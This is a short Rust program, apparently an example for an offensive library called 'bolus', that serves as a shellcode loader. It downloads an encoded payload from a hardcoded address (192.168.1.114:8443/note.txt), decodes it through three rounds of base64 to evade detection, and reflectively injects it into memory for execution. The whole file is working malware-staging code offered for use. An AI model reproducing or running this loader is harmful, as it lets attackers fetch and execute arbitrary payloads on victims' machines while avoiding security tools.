extern crate bolus;

use bolus::{
    inject,
    load,
    injectors::{
        InjectionType,
        InjectorType
    }
};


/// The URL where shellcode will be downloaded from
const URL: &str = "http://192.168.1.114:8443/note.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 3;

fn main() -> Result<(), String> {
    let injector = load(
        InjectorType::Base64Url((
            URL.to_string(),
            B64_ITERATIONS
        ))
    )?;
    inject(
        injector,
        InjectionType::Reflect,
        true
    )
}
